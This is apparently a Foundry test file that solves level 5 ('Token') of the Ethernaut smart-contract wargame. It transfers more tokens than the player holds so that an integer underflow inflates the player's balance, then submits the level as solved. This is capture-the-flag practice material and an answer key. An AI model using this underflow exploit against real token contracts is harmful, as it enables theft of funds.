// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "forge-std/Test.sol";
import "../src/Ethernaut.sol";
import "../src/5-Token/Token.sol";
import "../src/5-Token/TokenFactory.sol";

contract TokenTest is Test {
    Ethernaut ethernaut;
    TokenFactory level;
    Token instance;
    address player = address(123456);
    address instanceAddress;

    function setUp() public {
        ethernaut = new Ethernaut();
        level = new TokenFactory();
        ethernaut.registerLevel(level);
        startHoax(player);
        instanceAddress = ethernaut.createLevelInstance(level);
        instance = Token(payable(instanceAddress));
    }

    function testTokenHack() public {
        instance.transfer(address(999), 21);

        emit log_named_uint("balance of player:", instance.balanceOf(player));

        bool levelCompleted = ethernaut.submitLevelInstance(
            payable(instanceAddress)
        );
        assert(levelCompleted);
    }
}
